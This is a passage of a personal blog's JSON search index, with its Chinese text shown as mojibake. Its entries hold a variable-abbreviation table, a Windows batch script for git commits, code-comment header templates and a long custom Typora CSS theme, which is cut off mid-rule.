æ—¢è®¸ä¸€äººä»¥åçˆ±ï¼Œæ„¿å°½ä½™ç”Ÿä¹‹æ…·æ…¨ â€ data.jsonæ–‡ä»¶é“¾æ¥ å½“ä½¿ç”¨é‡åšæ—¥å¿—æ–‡ä»¶æ¥è¿›è¡Œæ•°æ®åº“æ¢å¤æ—¶ï¼ŒORACLEå°†è¯»å–å…¶ä¸­çš„é‡åšè®°å½•(åŒ…æ‹¬å…¶ä¸­çš„ä¿®æ”¹å‘é‡)ï¼Œå¹¶ä¸”å°†è¿™äº›ä¿®æ”¹ç”¨äºç›¸å…³çš„å—ä¸­ã€‚ å­˜å‚¨ç»“æ„ç®¡ç†ä¸»è¦å°±æ˜¯é€šè¿‡å¯¹è¡¨ç©ºé—´çš„ç®¡ç†æ¥å®ç°çš„ æ•ˆæœå¦‚ä¸‹ï¼š åŸºæœ¬è¯­è¨€(ä¸€) ä»£ç æ®µã€æ•°æ®æ®µã€BSSæ®µã€å †åŒºã€æ–‡ä»¶æ˜ å°„åŒºä»¥åŠæ ˆåŒº æ•°ç»„é•¿åº¦ä¸ºï¼š3 è¯·æŒ‰ä»»æ„é”®ç»§ç»­. . . ä½†æ•ˆç‡æ›´é«˜ For the Badge For the Badge","tags":[{"name":"æ‰‹å†Œ","slug":"æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/tags/%E6%89%8B%E5%86%8C/"},{"name":"CSS","slug":"CSS","permalink":"https://hodlyounger.github.io/tags/CSS/"}],"categories":[{"name":"E_æ‰‹å†Œ","slug":"E-æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/"}]},{"title":"ã€æ‰‹å†Œã€‘å¸¸ç”¨å˜é‡åç¼©å†™","date":"2023-10-27T01:24:02.491Z","path":"E_æ‰‹å†Œ/ã€æ‰‹å†Œã€‘å¸¸ç”¨å˜é‡åç¼©å†™/","text":"å˜é‡å ç¼©å†™ addition add address addr administrator adm answer ans application app arguments args array arr assemble asm asynchronization asyn attribute attr authority/authorize auth average avg begin beg bitmap bmp break brk buffer buf/buff button btn calculate calc calendar cal character char click clk clock clk color clr column col command cmd compare cmp config conf configuration cfg container cntr control ctrl coordinates coord copy cpy count cnt current cur cylinder cyl database db debug dbg decrease dec default def define def delete del department dept dependency/dependent/depends dep destination dst/dest develop dev device dev dialog dlg dictionary dict display disp division div document doc double dbl driver drv duplicate/duplication dup educate/education edu equal/equality/equivalence/equivalent eq error err escape esc execute exec extend ext float flt frame frm frequency freq function func government gov group grp hexadecimal hex horizontal horz image img implement impl increment inc index idx individual indv information info initialize init insert ins instance ins interrupt intr iterator it lable lbl length len library lib link lnk list lst maximum max memory mem message msg middle mid minimum min multiplication mul navigation nav negative neg number num object obj offset ofs operator opr optimization opt organization org original orig å˜é‡å ç¼©å†™ package pkg parameter param password pwd picture pic point pt pointer ptr position pos positive pos previous pre print prn program prg properties props public pub receive/received recv record rec reference ref register reg request req resource res result res response rsp return ret screen scr second sec segment seg select sel semaphore sem sequence seq server srv signal sig source src stack stk standard std statistic stat status stat storage stg string str student stu subtraction sub summation/summary sum synchronize sync system sys table tbl temporary tmp/temp test tst text txt time stamp ts total tot translate trans update upd upgrade upg unknown unk user usr utility util value val variable var version ver vertical vert window win thread thrd","tags":[{"name":"æ‰‹å†Œ","slug":"æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/tags/%E6%89%8B%E5%86%8C/"},{"name":"æ‰‹å†Œ/å˜é‡","slug":"æ‰‹å†Œ-å˜é‡","permalink":"https://hodlyounger.github.io/tags/%E6%89%8B%E5%86%8C-%E5%8F%98%E9%87%8F/"}],"categories":[{"name":"E_æ‰‹å†Œ","slug":"E-æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/"}]},{"title":"ã€é…ç½®ã€‘Wikiè‡ªåŠ¨æ›´æ–°è„šæœ¬","date":"2023-10-27T01:24:02.489Z","path":"E_æ‰‹å†Œ/ä¸ªäººé…ç½®/ã€é…ç½®ã€‘è‡ªåŠ¨æäº¤è„šæœ¬/","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748@echo off:reInputecho Gitè‡ªåŠ¨æ›´æ–°è„šæœ¬ï¼ˆè¾“å…¥åºå·é€‰æ‹©å‘½ä»¤ï¼‰echo ===================================================================================echo 1 ï¼ˆ:memo: æ›´æ–°æ–‡æ¡£ï¼‰echo 2 ï¼ˆ:fire:ï¼‰echo 3 ï¼ˆ:wrench: éƒ¨ç½²ï¼‰echo 4 ï¼ˆ:bug:ï¼‰echo 5 ï¼ˆæ‰‹åŠ¨æ·»åŠ commitä¿¡æ¯ï¼‰echo ===================================================================================echo.echo=choice /c:12345 /m:&quot;è¯·è¾“å…¥Git æ•°å­—å‘½ä»¤æ›´æ–°å˜åŠ¨ï¼š&quot;if %errorlevel% == 1 set change=&quot;:memo: æ›´æ–°æ–‡æ¡£&quot;if %errorlevel% == 2 set change=&quot;:bug:&quot;if %errorlevel% == 3 set change=&quot;:wrench: éƒ¨ç½²&quot;if %errorlevel% == 4 set change=&quot;:bug:&quot;if %errorlevel% == 5 set /p change=&quot;è¯·è¾“å…¥Commitä¿¡æ¯ï¼š&quot;if %change%==&quot;&quot; (clsecho -------echo æäº¤ä¿¡æ¯ä¸èƒ½ä¸ºç©ºï¼echo -------goto reInput )echo.:: cd &quot;D:\\\\wiki\\\\&quot;git pullgit add .git commit -m %change%git pushecho.echo ===================================================================================echo æ›´æ–°å®Œæ¯•echo.title &quot; update SUCCESS&quot;pause","tags":[{"name":"æ‰‹å†Œ","slug":"æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/tags/%E6%89%8B%E5%86%8C/"},{"name":"è‡ªå®šä¹‰","slug":"è‡ªå®šä¹‰","permalink":"https://hodlyounger.github.io/tags/%E8%87%AA%E5%AE%9A%E4%B9%89/"},{"name":"Config","slug":"Config","permalink":"https://hodlyounger.github.io/tags/Config/"}],"categories":[{"name":"E_æ‰‹å†Œ","slug":"E-æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/"},{"name":"ä¸ªäººé…ç½®","slug":"E-æ‰‹å†Œ/ä¸ªäººé…ç½®","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/%E4%B8%AA%E4%BA%BA%E9%85%8D%E7%BD%AE/"}]},{"title":"å‡½æ•°å£°æ˜","date":"2023-10-27T01:24:02.488Z","path":"E_æ‰‹å†Œ/ä¸ªäººé…ç½®/å‡½æ•°æ–‡ä»¶TODOå£°æ˜/","text":"å‡½æ•°å£°æ˜ 123456789/** @fn $MethodName$* @brief * @param[in] * @param[out] * @return * * @detail */ æ–‡ä»¶å£°æ˜ 1234567891011/******************************************************************************** * * Copyright (C) 2022 QIANXIN * All rights reserved * * filename: $FILE$ * description: * * created by shi.mingming on $DATE$ * ********************************************************************************/ TODO 1// TODO(user@mail.com): what: when:? how:ï¼Ÿ","tags":[{"name":"æ‰‹å†Œ","slug":"æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/tags/%E6%89%8B%E5%86%8C/"},{"name":"é…ç½®","slug":"é…ç½®","permalink":"https://hodlyounger.github.io/tags/%E9%85%8D%E7%BD%AE/"}],"categories":[{"name":"E_æ‰‹å†Œ","slug":"E-æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/"},{"name":"ä¸ªäººé…ç½®","slug":"E-æ‰‹å†Œ/ä¸ªäººé…ç½®","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/%E4%B8%AA%E4%BA%BA%E9%85%8D%E7%BD%AE/"}]},{"title":"ã€typoraã€‘bluebook è‡ªå®šä¹‰ä¿®æ”¹ä¸»é¢˜ä»£ç ","date":"2023-10-27T01:24:02.487Z","path":"E_æ‰‹å†Œ/ä¸ªäººé…ç½®/ã€typoraã€‘ä¸»é¢˜è‡ªå®šä¹‰/","text":"è¯´æ˜ ä¿®æ”¹äº†ç›®å½•ä¸­ ä»£ç å— çš„é¢œè‰² ä¿®æ”¹äº†ç¼–è¾‘é¡µé¢çš„æœ€å°å®½åº¦ ä»£ç  1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661671681691701711721731741751761771781791801811821831841851861871881891901911921931941951961971981992002012022032042052062072082092102112122132142152162172182192202212222232242252262272282292302312322332342352362372382392402412422432442452462472482492502512522532542552562572582592602612622632642652662672682692702712722732742752762772782792802812822832842852862872882892902912922932942952962972982993003013023033043053063073083093103113123133143153163173183193203213223233243253263273283293303313323333343353363373383393403413423433443453463473483493503513523533543553563573583593603613623633643653663673683693703713723733743753763773783793803813823833843853863873883893903913923933943953963973983994004014024034044054064074084094104114124134144154164174184194204214224234244254264274284294304314324334344354364374384394404414424434444454464474484494504514524534544554564574584594604614624634644654664674684694704714724734744754764774784794804814824834844854864874884894904914924934944954964974984995005015025035045055065075085095105115125135145155165175185195205215225235245255265275285295305315325335345355365375385395405415425435445455465475485495505515525535545555565575585595605615625635645655665675685695705715725735745755765775785795805815825835845855865875885895905915925935945955965975985996006016026036046056066076086096106116126136146156166176186196206216226236246256266276286296306316326336346356366376386396406416426436446456466476486496506516526536546556566576586596606616626636646656666676686696706716726736746756766776786796806816826836846856866876886896906916926936946956966976986997007017027037047057067077087097107117127137147157167177187197207217227237247257267277287297307317327337347357367377387397407417427437447457467477487497507517527537547557567577587597607617627637647657667677687697707717727737747757767777787797807817827837847857867877887897907917927937947957967977987998008018028038048058068078088098108118128138148158168178188198208218228238248258268278288298308318328338348358368378388398408418428438448458468478488498508518528538548558568578588598608618628638648658668678688698708718728738748758768778788798808818828838848858868878888898908918928938948958968978988999009019029039049059069079089099109119129139149159169179189199209219229239249259269279289299309319329339349359369379389399409419429439449459469479489499509519529539549559569579589599609619629639649659669679689699709719729739749759769779789799809819829839849859869879889899909919929939949959969979989991000100110021003100410051006100710081009101010111012101310141015101610171018101910201021102210231024102510261027102810291030103110321033103410351036103710381039104010411042104310441045104610471048104910501051105210531054105510561057105810591060106110621063106410651066106710681069107010711072107310741075107610771078107910801081108210831084108510861087108810891090109110921093109410951096109710981099110011011102110311041105110611071108110911101111111211131114111511161117111811191120112111221123112411251126112711281129113011311132113311341135@charset &quot;UTF-8&quot;;/* è‡ªå®šä¹‰è¡¨æ ¼ */tr.md-end-block:hover &#123; background-color: dodgerblue; font-weight: 700; color: white;&#125;/*** Custom fonts ***/@import url(&#x27;./blubook/fonts.css&#x27;);/*** Color setting ***/:root &#123; --side-bar-bg-color: #183055; --active-file-bg-color: #2f4566; --active-file-text-color: #ffffff; --active-file-border-color: #757575; --active-search-item-bg-color: #23242b; --item-hover-bg-color: #ececec; --item-hover-text-color: #000000; --control-text-color: #ddd; --window-border: 1px solid #183055; --code-cursor: #f0f0f0;&#125;/*** Btn in search bar ***/#filesearch-case-option-btn,#filesearch-word-option-btn &#123; background: var(--side-bar-bg-color);&#125;/****** #write basic ******/#write &#123; position: static; width: 90%; min-width: 90%; max-width: 700px; line-height: 1.6; transform: none; height: auto;&#125;/****** #write h1-h6 ******/#write h1,#write h2,#write h3,#write h4,#write h5,#write h6,#write p,#write pre &#123; width: auto;&#125;#write h1::before,#write h2::before,#write h3::before,#write h4::before,#write h5::before,#write h6::before &#123; position: absolute; right: calc(100% + 10px); bottom: 0; color: #b4b4b4; font-size: 1rem; font-weight: bold; font-variant: &#x27;small-caps&#x27;; border: 0; border-radius: 0; left: auto; float: none; padding: 0;&#125;#write h1 &#123; font-size: 2.2rem; font-style: normal; font-weight: 800; line-height: 2; margin-top: 14px; margin-bottom: 14px;&#125;#write h1::before &#123; content: &#x27;H1&#x27;; bottom: 1rem;&#125;#write h2 &#123; font-size: 2rem; font-weight: 800; font-style: normal; line-height: 2; margin-top: 14px; margin-bottom: 14px;&#125;#write h2::before &#123; content: &#x27;H2&#x27;; bottom: .85rem;&#125;#write h3 &#123; font-size: 1.6rem; font-weight: 800; line-height: 2; font-style: normal; margin-top: 14px; margin-bottom: 14px;&#125;#write h3::before &#123; content: &#x27;H3&#x27;; top: .44rem; padding: 3px 0 3px 0;&#125;#write h4 &#123; font-size: 1.4rem; font-weight: 800; line-height: 2; font-style: normal; margin-top: 14px; margin-bottom: 14px;&#125;#write h4::before &#123; content: &#x27;H4&#x27;; top: .4rem;&#125;#write h5,#write h6 &#123; font-size: 1.2rem; font-weight: 800; line-height: 2; font-style: normal; margin-top: 14px; margin-bottom: 14px;&#125;#write h5::before,#write h6::before &#123; top: .2rem;&#125;#write h5::before &#123; content: &#x27;H5&#x27;;&#125;#write h6::before &#123; content: &#x27;H6&#x27;;&#125;h3.md-focus:before,h4.md-focus:before,h5.md-focus:before,h6.md-focus:before &#123; color: #ddd; color: var(--heading-char-color); border: 1px solid; border-radius: 3px; position: absolute; left: -1.642857143rem; top: .357142857rem; float: left; font-size: 9px; padding-left: 2px; padding-right: 2px; vertical-align: bottom; font-weight: 400; line-height: 2;&#125;/****** Global Style ******/body &#123; margin: 0; font-family: &#x27;Glow Sans SC&#x27;, -apple-system, sans-serif; font-weight: 500; text-rendering: geometricPrecision; -webkit-font-smoothing: antialiased; -webkit-text-size-adjust: 100%&#125;html,body &#123; color: #242A31; /* width: 100%; */ height: 100%; margin: 0; padding: 0; font-size: 14px; background: #ffffff; box-sizing: border-box; line-height: 1rem; text-size-adjust: 100%; -moz-osx-font-smoothing: grayscale; -webkit-text-size-adjust: 100%;&#125;hr &#123; border-color: #e6ecf1; height: 2px; border-top: 2px solid #e6ecf1;&#125;img &#123; max-width: 80%; margin-top: 0.2rem; margin-bottom: 0.2rem;&#125;/****** ul ol Style ******/ul&gt;li&gt;ul&gt;li &#123; list-style-type: circle;&#125;ul&gt;li&gt;ul&gt;li&gt;ul&gt;li &#123; list-style-type: square;&#125;ol,ul &#123; padding-left: 2rem; line-height: 1;&#125;ol&gt;li &#123; list-style-type: decimal&#125;ol&gt;li&gt;ol&gt;li &#123; list-style-type: lower-alpha&#125;ol&gt;li&gt;ol&gt;li&gt;ol&gt;li &#123; list-style-type: lower-roman&#125;/****** Table Style ******/table &#123; padding: 0; word-break: initial;&#125;table tr &#123; border-top: 1px solid #dfe2e5; margin: 0; padding: 0;&#125;table tr:nth-child(2n),thead &#123; background-color: #f5f7f9;&#125;table tr th &#123; font-weight: bold; border: 1px solid #dfe2e5; border-bottom: 0; margin: 0; padding: 6px 13px;&#125;table tr td &#123; border: 1px solid #dfe2e5; margin: 0; padding: 6px 13px;&#125;table tr th:first-child,table tr td:first-child &#123; margin-top: 0;&#125;table tr th:last-child,table tr td:last-child &#123; margin-bottom: 0;&#125;/****** YAML Style ******/pre.md-meta-block &#123; font-size: .85rem !important; color: #5d5d5d; min-height: .8rem; white-space: pre-wrap; background: #f5f7f9; display: block; overflow-x: hidden; padding: 1rem; border-radius: 8px;&#125;/****** Global Text ******/p &#123; font-size: 16px; font-family: &quot;Glow Sans SC&quot;, -apple-system, sans-serif; font-weight: 500; line-height: 1.6; font-style: normal; color: rgb(59, 69, 78);&#125;a &#123; /* color: rgb(164, 78, 237); */ color: rgb(56, 132, 254); font-weight: 500; text-decoration: none; text-decoration-style: none; cursor: pointer; padding: 0 3px 0 3px;&#125;#write a:hover &#123; color: rgb(56, 132, 254); text-decoration: underline; text-decoration-style: solid;&#125;strong &#123; font-weight: 700;&#125;mark &#123; background: #87CEFA; padding: 0 2px 0 2px; margin: 0 2px 0 2px;&#125;h1 &#123; font-size: 2rem; font-style: normal; font-weight: 800; line-height: 2; margin-top: 14px; margin-bottom: 14px;&#125;h2 &#123; font-size: 1.8rem; font-weight: 800; font-style: normal; line-height: 2; margin-top: 14px; margin-bottom: 14px;&#125;h3 &#123; font-size: 1.6rem; font-weight: 800; line-height: 2; font-style: normal; margin-top: 14px; margin-bottom: 14px;&#125;h4 &#123; font-size: 1.2rem; font-weight: 800; line-height: 2; font-style: normal; margin-top: 14px; margin-bottom: 14px;&#125;h5,h6 &#123; font-size: 1rem; font-weight: 800; line-height: 2; font-style: normal; margin-top: 14px; margin-bottom: 14px;&#125;/****** Print header ******/@media print &#123; .typora-export * &#123; -webkit-print-color-adjust: exact; &#125; #write h1::before &#123; content: &#x27;&#x27;; bottom: 1rem; &#125; #write h2::before &#123; content: &#x27;&#x27;; bottom: 1rem; &#125; #write h3::before &#123; content: &#x27;&#x27;; bottom: 1rem; &#125; #write h4::before &#123; content: &#x27;&#x27;; bottom: 1rem; &#125; #write h5::before &#123; content: &#x27;&#x27;; bottom: 1rem; &#125; #write h6::before &#123; content: &#x27;&#x27;; bottom: 1rem; &#125;&#125;/****** #write Code Fences ******/#write .md-fences &#123; -webkit-font-smoothing: initial; margin: 1rem 0 1rem 0 !important; line-height: 1.43rem; border-radius: 3px; font-size: 0.95rem; word-wrap: normal;&#125;#write .CodeMirror-wrap .CodeMirror-code pre &#123; padding-left: 30px; line-height: 1.55rem;&#125;#write .CodeMirror-cursors .CodeMirror-cursor &#123; border-left: 2px solid var(--code-cursor);&#125;#write code,tt &#123; margin: 0 2px; padding: 4px 6px; border-radius: 6px; font-size: 0.92rem !important; background: #f5f7f9; display: inline; vertical-align: bottom; line-height: 1.8;&#125;#write .md-footnote &#123; color: var(--main-5); background-color: var(--main-1);&#125;.cm-s-inner.CodeMirror,.cm-s-inner .CodeMirror-gutters &#123; padding: 0.75rem 0.15rem 0.75rem 0.15rem; background-color: #183055 !important; color: #f8f8f2 !important; border: none; border-radius: 6px;&#125;.code-tooltip &#123; box-shadow: 0 1px 1px 0 rgba(0, 28, 36, .3); border-top: 1px solid #eef2f2; background: #183055; border-radius: 6px;&#125;.md-fences &#123; font-size: .9rem; position: relative !important; display: block; page-break-inside: avoid; text-align: left; overflow: visible; white-space: pre; background: inherit;&#125;.md-fences &#123; background-color: #f8f8f8; margin-bottom: 15px; margin-top: 15px; padding-top: 8px; padding-bottom: 6px;&#125;.md-fences,tt &#123; border-radius: 3px; /* color: #f0f0f0; */ padding: 0; font-size: 0.9rem;&#125;/****** Sidebar ******/#typora-sidebar * &#123; /* color: #f0f0f0; */ color: white;&#125;code &#123; color: #3399CC!important; font-weight: 700;&#125;#typora-sidebar .file-tree-node.file-library-file-node.active .file-node-background &#123; border-left: 5px solid #3884ff; height: 2.2rem;&#125;#sidebar-files-menu &#123; border: 1px solid rgba(0, 2, 3, 0.7);&#125;.file-list-item &#123; border-bottom: var(--window-border);&#125;.file-list-item &#123; overflow: hidden; padding: 12px; border-bottom: 1px solid #eee; border-bottom: var(--window-border); cursor: pointer; padding-right: 8px; padding-top: 12px; padding-left: 24px; transition: top .5s; -webkit-transition: top .5s;&#125;.file-list-item.active &#123; background: #2f4566; /* background: var(--active-file-bg-color); */ color: var(--active-file-text-color); border-radius: 12px;&#125;.file-list-item:not(.active) &#123; opacity: .9;&#125;.file-node-content &#123; padding-top: 6px; margin: 0 0 8px 0; cursor: default; color: var(--control-text-color); white-space: nowrap; height: 2.2rem; line-height: 1.5;&#125;.ty-on-drag-enter &#123; background-color: #2f4566; color: var(--item-hover-text-color);&#125;.file-node-content:active &#123; border-radius: 0px !important; background: #2f4566;&#125;.active .file-node-content &#123; font-weight: bold;&#125;.file-node-content:hover &#123; cursor: pointer; border-radius: 0px !important;&#125;.file-node-icon,.file-node-open-state &#123; display: block; float: left; line-height: 1.5; min-height: 15px;&#125;.file-node-icon &#123; margin-right: 6px;&#125;.file-list-item-file-name &#123; font-weight: 700; margin-bottom: 3px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; width: 100%; line-height: 2;&#125;.sidebar-footer &#123; background: var(--side-bar-bg-color); border-top: 1px #555 solid;&#125;.html-for-mac #file-library-search-input &#123; border: 0; border-bottom: 1px solid #ccc; line-height: 16px; margin: 5px 16px 0px 0; width: 0; /* -webkit-flex: 1; */ flex: 1; background: 0 0; color: #bbc0ca !important; /* transform: translateY(-3px); */ /* overflow: auto; */ padding-top: 6px;&#125;#typora-sidebar #ty-sidebar-footer .sidebar-footer-item:hover &#123; background: #021d43;&#125;#typora-sidebar #outline-content .outline-item:hover &#123; background: #202020;&#125;#typora-sidebar #ty-sidebar-footer #sidebar-files-menu .show+.menuitem-group-label.show &#123; border-color: #202020;&#125;#typora-sidebar #ty-sidebar-footer &#123; border-top: 1px solid #19191c;&#125;#typora-sidebar #ty-sidebar-footer #sidebar-files-menu li&gt;a:hover &#123; background: #021d43;&#125;#typora-sidebar #ty-sidebar-footer #sidebar-files-menu .ty-side-sort-btn.active,#typora-sidebar #ty-sidebar-footer #sidebar-files-menu .ty-side-sort-btn:hover &#123; color: #3884FF;&#125;#typora-sidebar #ty-sidebar-footer #sidebar-files-menu .ty-side-sort-btn.active &#123; background: #001129;&#125;#typora-sidebar .file-list-item.file-library-node:not(.active):hover &#123; background: #243959; border-radius: 12px;&#125;#typora-sidebar .file-tree-node.file-library-file-node:not(.active):hover .file-node-background &#123; background: #243959; border-radius: 12px; height: 2.2rem;&#125;/****** Quote style ******/blockquote &#123; position: relative; /* margin: 1rem 1 1rem 2rem; */ padding: 1rem; color: #827676; background-color: #f5f7f9; border-radius: 6px; line-height: 1;&#125;blockquote::before &#123; content: &#x27;&#x27;; position: absolute; top: 0rem; left: 0rem; height: 100%; width: .30rem; background: #3884ff; border-top-left-radius: 6px; border-bottom-left-radius: 6px;&#125;/****** task list style ******/.task-list &#123; padding-left: 0;&#125;.md-task-list-item&gt;input &#123; top: -0.2rem; margin-left: -1.6rem; margin-top: calc(1rem + 1px); -webkit-appearance: initial;&#125;.md-task-list-item&gt;input:before &#123; border: 1px solid#0185ff; border-radius: 1rem; width: 1rem; height: 1rem; background: #fff; content: &#x27; &#x27;; transition: background-color 200ms ease-in-out; display: block;&#125;.md-task-list-item&gt;input:checked:before,.md-task-list-item&gt;input[checked]:before &#123; background: #0185ff; border-width: 1px; transition: background-color 200ms ease-in-out;&#125;.md-task-list-item&gt;input:checked:after,.md-task-list-item&gt;input[checked]:after &#123; opacity: 1;&#125;.md-task-list-item&gt;input:after &#123; opacity: 1; -webkit-transition: opacity 0.05s ease-in-out; -moz-transition: opacity 0.05s ease-in-out; transition: opacity 0.05s ease-in-out; -webkit-transform: rotate(-45deg); -moz-transform: rotate(-45deg); transform: rotate(-45deg); position: absolute; top: 0.25rem; left: 0.19rem; width: 0.6rem; height: 0.375rem; border: 2px solid #fff; border-top: 0; border-right: 0; content: &#x27; &#x27;; opacity: 0;&#125;/****** Source style ******/.typora-sourceview-on #write &#123; display: none&#125;#typora-source &#123; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background-color: inherit; padding-right: 0; padding-left: 0; padding-top: 0; display: none; line-height: 1.5&#125;.mac-seamless-mode #typora-source &#123; top: 20px&#125;#typora-source .CodeMirror &#123; height: 100%; overflow-x: hidden&#125;#typora-source .CodeMirror-gutters &#123; left: initial !important&#125;#typora-source .CodeMirror-lines &#123; padding-top: 30px; padding-bottom: 60px; padding-left: 60px; padding-right: 30px; max-width: 800px; margin: 0 auto&#125;#typora-source .CodeMirror-wrap .CodeMirror-scroll &#123; overflow-y: auto&#125;.CodeMirror-activeline .cm-trailing-space-new-line:after &#123; opacity: .6&#125;.CodeMirror-activeline .cm-starttab .cm-tab:after &#123; background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAMCAYAAAAkuj5RAAAAAXNSR0IArs4c6QAAAGFJREFUSMft1LsRQFAQheHPowAKoACx3IgEKtaEHujDjORSgWTH/ZOdnZOcM/sgk/kFFWY0qV8foQwS4MKBCS3qR6ixBJvElOobYAtivseIE120FaowJPN75GMu8j/LfMwNjh4HUpwg4LUAAAAASUVORK5CYII=); background-position: right; background-repeat: no-repeat; width: 100%; opacity: 1&#125;.CodeMirror-activeline .cm-startspace:after,.CodeMirror-activeline .cm-trailing-space-new-line:after &#123; opacity: .2&#125;.cm-s-inner .CodeMirror-vscrollbar &#123; display: none !important&#125;#typora-source .CodeMirror-gutter-wrapper &#123; position: absolute !important; left: -6ch !important; min-width: 4ch !important; text-align: right; font-family: monospace; font-size: .8rem; margin-top: .1rem; display: inline-block; opacity: .6&#125;#typora-source .CodeMirror-linenumber &#123; width: auto !important; visibility: hidden&#125;#typora-source .CodeMirror-sizer &#123; margin-left: 0 !important&#125;#typora-source .CodeMirror-gutter &#123; min-width: 4ch !important&#125;#typora-source .CodeMirror-activeline .CodeMirror-linenumber,#typora-source .CodeMirror-linenumber.CodeMirror-linenumber-show &#123; visibility: visible&#125;#typora-source .CodeMirror-code&gt;.CodeMirror-activeline::before,#typora-source .CodeMirror-code&gt;:first-child::before,#typora-source .CodeMirror-code&gt;:last-child::before,#typora-source .CodeMirror-code&gt;:nth-child(10n)::before &#123; visibility: visible&#125;.cm-s-typora-default .cm-header1:not(.cm-atom):not(.cm-s-inner) &#123; font-size: 2.2rem;&#125;.cm-s-typora-default .cm-header2:not(.cm-atom):not(.cm-s-inner) &#123; font-size: 2rem;&#125;.cm-s-typora-default .cm-header3:not(.cm-atom):not(.cm-s-inner) &#123; font-size: 1.6rem;&#125;.cm-s-typora-default .cm-header4:not(.cm-atom):not(.cm-s-inner) &#123; font-size: 1.4rem;&#125;.cm-s-typora-default .cm-header5:not(.cm-atom):not(.cm-s-inner) &#123; font-size: 1.2rem;&#125;.cm-s-typora-default .cm-header6:not(.cm-atom):not(.cm-s-inner) &#123; font-size: 1.2rem;&#125;.cm-s-typora-default .cm-header,.cm-s-typora-default .cm-property &#123; color: #183055 !important;&#125;pre.CodeMirror-line &#123; page-break-inside: avoid;&#125;/****** Code style ******/code &#123; font-size: .9rem; /* color: #333333; /* #537AA2; border: 1px solid #d0d0d0; */ font-family: &#x27;Cascadia Code&#x27;, Consolas, &#x27;Noto Sans SC&#x27;, &#x27;Courier New&#x27;, monospace; padding: .2rem .2rem; border-radius: 3px; background: #f5f7f9 !important; display: inline; vertical-align: bottom; line-height: 1.8;&#125;code,pre &#123; font-size: 95% !important; font-weight: normal; font-family: &#x27;Cascadia Code&#x27;, Consolas, &#x27;Noto Sans SC&#x27;, &#x27;Courier New&#x27;, monospace; -webkit-font-smoothing: initial; -moz-osx-font-smoothing: initial&#125;/****** The flow chart ******/pre.md-fences[lang=sequence].md-focus .md-diagram-panel,pre.md-fences[lang=flow].md-focus .md-diagram-panel,pre.md-fences[lang=mermaid].md-focus .md-diagram-panel &#123; position: -webkit-sticky; border: 1px solid #777; border-radius: 6px; margin-top: 6px;&#125;.code-tooltip .ty-input,.code-tooltip input &#123; background-color: transparent; border: 0; margin-top: 2px; margin-bottom: 2px; margin-left: 0; margin-right: 0; border-radius: 3px; text-align: center; min-width: 140px; display: inline-block; padding: 0 4px; line-height: 1.5; color: #fff;&#125;.enable-diagrams pre.md-fences[lang=sequence] .code-tooltip,.enable-diagrams pre.md-fences[lang=flow] .code-tooltip,.enable-diagrams pre.md-fences[lang=mermaid] .code-tooltip &#123; right: 8px; bottom: -2.2em;&#125;/****** Windows contral ******/.megamenu-menu-list li a.active,.megamenu-menu-list:not(.saved) li a:hover &#123; background-color: #285e8e;&#125;/****** Fix ******/.md-tab &#123; display: inline-block; white-space: pre; font-family: initial;&#125;div.md-mathjax-preview.mathjax-candidate.mathjax-candidate-show &#123; background-color: white !important; -webkit-user-modify: read-only;&#125;.mathjax-candidate &#123; text-align: center; padding-top: inherit; overflow-x: auto; padding: 10px 0; background-color: white;&#125;input &#123; font-weight: bold; background-color: inherit; background-color: var(--bg-color); color: var(--text-color) !important;&#125;#write input &#123; transform: translateY(-6.5px);&#125;.task-list &#123; padding-left: 0;&#125;.md-task-list-item&gt;input &#123; top: -0.2rem; margin-left: -1.6rem; margin-top: calc(1rem + 1px);&#125;.auto-suggest-container li &#123; padding: 1px; padding-left: 10px; padding-right: 10px; cursor: pointer; -webkit-user-select: none; user-select: none; min-width: 124px; position: relative; line-height: 1.4;&#125;.auto-suggest-container &#123; border: 1px solid #ddd; border-radius: 3px; box-shadow: 0 0 1px rgba(0, 0, 0, .1); position: fixed; background-color: #fff; background-color: var(--bg-color); z-index: 10; font-size: .9rem; display: none; padding: 4px 6px 4px 6px; line-height: 20px;&#125;/****** Code highlight ******/.cm-s-inner .CodeMirror-guttermarker,.cm-s-inner .CodeMirror-guttermarker-subtle,.cm-s-inner .CodeMirror-linenumber &#123; color: #596774;&#125;.cm-s-inner .CodeMirror-cursor &#123; border-left: 1px solid #f8f8f0;&#125;.cm-s-inner div.CodeMirror-selected &#123; background: rgba(255, 255, 255, 0.15);&#125;.cm-s-inner.CodeMirror-focused div.CodeMirror-selected &#123; background: rgba(255, 255, 255, 0.10);&#125;.cm-s-inner .CodeMirror-line::selection,.cm-s-inner .CodeMirror-line&gt;span::selection,.cm-s-inner .CodeMirror-line&gt;span&gt;span::selection &#123; background: rgba(255, 255, 255, 0.10);&#125;.cm-s-inner .CodeMirror-line::-moz-selection,.cm-s-inner .CodeMirror-line&gt;span::-moz-selection,.cm-s-inner .CodeMirror-line&gt;span&gt;span::-moz-selection &#123; background: rgba(255, 255, 255, 0.10);&#125;.cm-s-inner .CodeMirror-activeline-background &#123; background: rgba(0, 0, 0, 0);&#125;.cm-s-inner .cm-keyword &#123; color: rgba(199, 146, 234, 1);&#125;.cm-s-inner .cm-operator &#123; color: rgba(233, 237, 237, 1);&#125;.cm-s-inner .cm-variable-2 &#123; color: #80CBC4;&#125;.cm-s-inner .cm-variable-3 &#123; color: #82B1FF;&#125;.cm-s-inner .cm-builtin &#123; color: #DECB6B;&#125;.cm-s-inner .cm-atom 